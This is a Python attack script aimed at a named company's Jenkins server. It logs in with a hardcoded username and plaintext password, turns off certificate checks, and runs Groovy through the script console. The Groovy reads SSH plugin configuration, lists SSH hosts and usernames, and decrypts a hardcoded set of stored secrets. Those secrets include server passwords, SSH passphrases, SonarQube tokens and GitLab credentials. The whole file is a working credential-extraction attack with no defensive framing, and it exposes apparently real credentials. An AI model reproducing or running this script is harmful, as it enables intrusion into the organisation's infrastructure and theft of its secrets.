import requests, urllib3
urllib3.disable_warnings()

BASE = "https://jenkins-ng.dev.claroshop.com"
USER = "eduardo.cruz"
PASS = "xwMyIxfkZZaDNkFg"

s = requests.Session()
s.auth = (USER, PASS)
s.verify = False
s.headers["User-Agent"] = "Mozilla/5.0"

r = s.get(f"{BASE}/crumbIssuer/api/json", timeout=20)
r.raise_for_status()
cd = r.json()
s.headers[cd["crumbRequestField"]] = cd["crumb"]
print(f"[+] Crumb OK")

run_url = f"{BASE}/scriptText"

SCRIPT_HOSTS = '''
def r = ["bash","-c","cat /var/jenkins_home/jenkins.plugins.publish_over_ssh.BapSshPublisherPlugin.xml 2>/dev/null"].execute().text
def hosts = []
def m = r =~ /<name>(.*?)<\\/name>[\\s\\S]*?<hostname>(.*?)<\\/hostname>[\\s\\S]*?<username>(.*?)<\\/username>/
while (m.find()) {
    hosts << "${m.group(1)} | ${m.group(2)} | ${m.group(3)}"
}
println "=== ALL SSH HOSTS (${hosts.size()}) ==="
hosts.each { println it }
'''

resp = s.post(run_url, data={"script": SCRIPT_HOSTS}, timeout=30)
print(resp.text)

SCRIPT_DECRYPT = '''
import hudson.util.Secret

def secrets = [
    "CSDEV01-2 password": "{AQAAABAAAAAQu80z2+IB7HCyH6EqB7CyrqD/8L59GLuNixILnRADawE=}",
    "CSQAAPP01-1 password": "{AQAAABAAAAAQvCfrolDy/ZNokUSuHnrCLCvkuSvvyESOlJo+6Z48AsU=}",
    "CSQAAPP02-1 password": "{AQAAABAAAAAQyev4KTergPPsDf6Mo7tiaOBApz/lPrOCgAw6bhXbaB0=}",
    "CSQANGIN01-1 password": "{AQAAABAAAAAQLA3k+0y8tIEG7CER1Qb/4GMKdft/K0Ffq0iB87nDzlA=}",
    "CSQAAMDIN02-1 password": "{AQAAABAAAAAQYyrZCIEFX8tZldI9rnmmuTW0dGP31ZDwqN0gmMVb8LI=}",
    "CSQAAMDIN-2 password": "{AQAAABAAAAAQdh+MnHnNTeJMaVVjZ2RnzT5faU6Y/k5tR7LfvBF9POU=}",
    "CSQATASK01-1 password": "{AQAAABAAAAAQnZN50DGRx8sMSnEPwLwmhPez3ZxNiNBA5KeoHDPxC1s=}",
    "SSH key passphrase 1": "{AQAAABAAAAAQ42FNcrbem2jkp6cdmaA7BbEgy3MSw0NYIBn4Ss98g5M=}",
    "SSH key passphrase 2": "{AQAAABAAAAAQNlyClu6roHawX+AocbXjijQxqhMEm55hdYRr6vpuS78=}",
    "jenkins registry password": "{AQAAABAAAAAQ9452cJnraFrLAfJV9kn5QC3nQd+zuutFOfxslMVzkek=}",
    "SonarQube token": "{AQAAABAAAAAwGfhCBiqSioVfRUy0Jjtc6avSTVG7Saw/x3Ianltbp1hM+Axorp9teC+WrRGHYVtihJMJ0TrmrIdSe4VkSrerLg==}",
    "SonarQube token 2": "{AQAAABAAAAAwnuFSunS5LhSh2iFHGL/iD+kPmmvC3OksByzGfXdKNCe4rj25H8owiUoMmLnXJ/JL6BI+jGs0n7iPd6karcIz7Q==}",
    "sophia-mrk-i password": "{AQAAABAAAAAgh/THGY6+GcJCGIPljbO/WOCY1RGTUQEnT0ziskERAmTk6NEYEi53S0S2nm+M8vZo}",
    "jenkins_legacy gitlab": "{AQAAABAAAAAQeRu2Vn2RVgFjYfW8tvGkYKj6andZsKVAcUEL0mVwuYc=}",
    "jenkins.legacy.sn.se gitlab": "{AQAAABAAAAAQj/Ej+K0aA0UyMF6EkLZ/DnFGgU0N7ipDmHsA/rRWZWU=}",
    "GitLabClaro Jenkins": "{AQAAABAAAAAQb7mQq2kW+zLq8gQajTTbMEGrleM9zxTZeZDYuxiDaGA=}",
]

println "=== DECRYPTED SECRETS ==="
secrets.each { label, encrypted ->
    try {
        def decrypted = Secret.fromString(encrypted).getPlainText()
        println "${label}: ${decrypted}"
    } catch (Exception e) {
        println "${label}: FAILED - ${e.message}"
    }
}
'''

resp2 = s.post(run_url, data={"script": SCRIPT_DECRYPT}, timeout=30)
print(resp2.text)

SCRIPT_MORE_SECRETS = '''
import hudson.util.Secret

def r = ["bash","-c","cat /var/jenkins_home/jenkins.plugins.publish_over_ssh.BapSshPublisherPlugin.xml 2>/dev/null"].execute().text
def m = r =~ /<secretPassword>\\{(.*?)\\}<\\/secretPassword>/
def i = 0
println "=== ALL ENCRYPTED PASSWORDS IN SSH PLUGIN ==="
while (m.find()) {
    def enc = "{${m.group(1)}}"
    try {
        def dec = Secret.fromString(enc).getPlainText()
        println "secret_${i}: ${dec}"
    } catch (Exception e) {
        println "secret_${i}: FAILED"
    }
    i++
}

def m2 = r =~ /<secretPassphrase>\\{(.*?)\\}<\\/secretPassphrase>/
i = 0
println "\\n=== ALL ENCRYPTED PASSPHRASES ==="
while (m2.find()) {
    def enc = "{${m2.group(1)}}"
    try {
        def dec = Secret.fromString(enc).getPlainText()
        println "passphrase_${i}: ${dec}"
    } catch (Exception e) {
        println "passphrase_${i}: FAILED"
    }
    i++
}
'''

resp3 = s.post(run_url, data={"script": SCRIPT_MORE_SECRETS}, timeout=30)
print(resp3.text)
